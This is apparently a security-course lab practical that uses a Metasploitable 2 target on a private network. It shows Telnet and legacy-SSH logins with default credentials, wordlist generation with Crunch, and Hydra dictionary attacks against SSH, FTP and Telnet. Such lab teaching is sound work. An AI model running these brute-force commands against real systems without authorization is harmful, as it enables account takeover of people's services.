# Password Cracking, Remote Login & Wordlist Generation

Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system.

This practical covers remote login, wordlist generation, and credential testing in the lab.

## 🧪 Requirements

- Kali Linux virtual machine — Attacker
- Metasploitable 2 virtual machine — Target
- Both machines configured on the same virtual network (for example, NAT or Host-Only)

## 🎯 Objectives

- Establish remote sessions using Telnet and SSH.
- Troubleshoot legacy SSH key negotiation errors.
- Understand the purpose of wordlist generators.
- Generate custom dictionaries using Crunch.
- Automate password testing against multiple protocols using Hydra.

---

# Remote Access Basics

## 1. Remote Access via Telnet

Telnet is an older, unencrypted protocol used for remote command-line access.

The Metasploitable 2 target uses the default credentials `msfadmin:msfadmin`.

**Command:**

```bash
telnet 192.168.37.130
```

**Purpose:**  
Establishes a remote terminal session.

The practical showed a successful login after entering the correct username and password.

---

## 2. Remote Access via SSH

SSH (Secure Shell) is a cryptographic network protocol for operating network services securely over an unsecured network.

### Failed Attempt

```bash
ssh 192.168.37.130 -l msfadmin
```

**Error:**

```text
Unable to negotiate with 192.168.37.130 port 22:
no matching host key type found.
Their offer: ssh-rsa,ssh-dss
```

### Successful Attempt — Lab Workaround

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@192.168.37.130
```

**Purpose:**  
Explicitly allows the legacy `ssh-rsa` algorithm required by the outdated Metasploitable 2 SSH server.

---

# Wordlist Generation with Crunch

Crunch is a wordlist generator where you can specify standard character sets or a completely custom character set.

## 3. Basic Alphabetic Generation

**Command:**

```bash
crunch 1 2
```

**Purpose:**  
Generates all combinations from length 1 to 2 using the default lowercase alphabet.

---

## 4. Numeric Generation

**Command:**

```bash
crunch 1 2 0123456789
```

**Purpose:**  
Generates all combinations from length 1 to 2 using only numbers (0–9).

---

## 5. Numeric with Symbols

**Command:**

```bash
crunch 2 4 ab12#$
```

**Purpose:**  
Generates combinations of length 2 to 4 using the specified custom character set: `a, b, 1, 2, #, $`.

---

## 6. Permutation Generation

**Command:**

```bash
crunch 4 4 -p abcd
```

**Purpose:**  
The `-p` flag treats the input as a set of characters to permutate.

It generates unique permutations such as:

```text
abcd
abdc
acbd
...
```

---

## 7. Saving Output to a File

**Command:**

```bash
crunch 4 4 abcd > pass.txt
```

**Purpose:**  
Generates the combinations and redirects the output to `pass.txt` instead of displaying it on the screen.

---

# Password Cracking with Hydra

Hydra is a fast and flexible online password-cracking tool. It performs dictionary attacks against various network protocols.

The wordlist generated with Crunch (`pass.txt`) is used for credential testing.

## 8. Hydra — SSH

**Command:**

```bash
hydra -l msfadmin -P pass.txt ssh://192.168.37.130
```

**Purpose:**  
Attempts to test passwords for the `msfadmin` account against the SSH service.

- `-l` — specifies a single login name
- `-P` — specifies the password list
- `ssh://` — targets the SSH service

---

## 9. Hydra — FTP

**Command:**

```bash
hydra -l msfadmin -P pass.txt ftp://192.168.37.130
```

**Purpose:**  
Targets the FTP service running on port 21.

---

## 10. Hydra — Telnet

**Command:**

```bash
hydra -l msfadmin -P pass.txt telnet://192.168.37.130
```

**Purpose:**  
Targets the Telnet service on port 23.

---

# Practical Flow

```text
Remote Access
     │
     ├── Telnet
     └── SSH
          │
          ▼
   Wordlist Generation
          │
          └── Crunch
                │
                ▼
          pass.txt
                │
                ▼
          Credential Testing
                │
       ┌────────┼────────┐
       ▼        ▼        ▼
      SSH      FTP     Telnet
       │        │        │
       └────────┴────────┘
               Hydra
```

---

# Key Takeaways

- Telnet provides remote command-line access but is an older, unencrypted protocol.
- SSH provides secure remote access, but the old Metasploitable 2 server requires a legacy algorithm workaround.
- Crunch can generate custom wordlists.
- The `-p` option can be used for permutation generation.
- `>` redirects generated output to a file.
- Hydra can perform credential testing against SSH, FTP, and Telnet.
